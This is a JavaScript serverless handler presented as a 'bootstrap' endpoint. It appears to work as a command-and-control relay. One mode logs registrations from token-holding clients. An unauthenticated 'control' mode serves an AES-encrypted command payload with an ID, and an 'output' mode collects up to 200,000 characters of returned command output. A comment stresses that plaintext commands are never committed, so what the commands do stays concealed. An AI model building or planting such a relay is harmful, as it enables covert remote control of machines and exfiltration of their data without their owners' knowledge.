import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';

// These two values are updated temporarily while the owner's server is being configured.
// The command body is always AES-256 encrypted with a secret generated on the VPS;
// plaintext commands are never committed to this repository.
const CONTROL_ID = '4';
const CONTROL_PAYLOAD = 'U2FsdGVkX1+OX1tPaNpJt3tVJY2FDBCslua8cYjgl7P37tieZDTKPxefho3vZeBk5LrBYwYoZEULdr7Br2iCgawXTXxpJ4ziz17FHDjNKIu0s2KSyGn9LPL6EIqAm2damFSf5dg+/sp8s/9Lp4ddw+FlaS4ySBZU0Wjswaa4LE0f/PBq071wMflN5/9UoXoqRauuO7pLc/t1ih2p+KgiyDDc99IEPu7hE2OsB77D7Jhb6CKliSa682Q6I7THYw1RUl9pY1XL1maUTzOVa6gW5y3KD6lhsXIiWdXB1/POxwYv5moI+ztYfS3z1r2qTiv7uB+/941frjvO3CFxEbPR1zuqb0KKeLl5wJabnLquYXY0P4R0nwBo0C7S258E/wbtXiMtyqGIwt50Y0wjK4EZcpvztFfqxCzf+DUZQCpdc9omiHMFNdu19O1DnkVXQy+Qx3MiOqd4WIuw84yUI45nE95AF9tJx1bJGMsRL411XUvwDkeiWGEw746Ou1+CzkFujQgpf+mVA418x/khJ8t53nC6+6lOo4EoYAw76xEWZR1gTYUw9Xlfc/E/GjPyaNXXb7APMDxNPqTYjn9KE8Q9oVZQ3/DNcqgvQxAMDRawZh+umGskXpNhT6ggPrgr+Ys2z0O1STu6Do+ID3IWFac+Bzzqvt3UVSjh6ZpxhkrUFfSg5cZdKHhbgE8+yb/2WqQ3pZPs6DyqPl2/7L9hQCCGwyXC8dwMFtDPIv6dGZ/A2I397UuRnUrqHOddoDY3UI6p1srtuIBdS8AxI11104O7uBIfS1Cz2qnpTx8HSoQvVZ/Dx7JEl13tD7zxiDsWnUnIcDoQxPaUExf6i58MXf6Z9t0P9E/aKtilxYwSNY+61SujJ5trOSNiC9QiS/emYjVR6DXtEbH15SInC7J4274XhWWYuszOKEik5RlSNKvSRM8qNo9itK6OMnwLFbzCREg4iC9UBdHFgMB4DtZaqmiG/vEG11Ev7f6yOPow/0hbGjTd3huiboCIeXFPlkYkIp0td9TWmefmIN39CnBJQi+01bfkdZCWjnj/Whpm5bcZ/Wzq7Tyzee9OCQvGcukZhill';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);

  const chunks = [];
  for await (const chunk of request) {
    chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  }
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');

  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) {
      return response.status(404).send('Not found');
    }
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }

  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }

  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }

  return response.status(404).send('Not found');
}
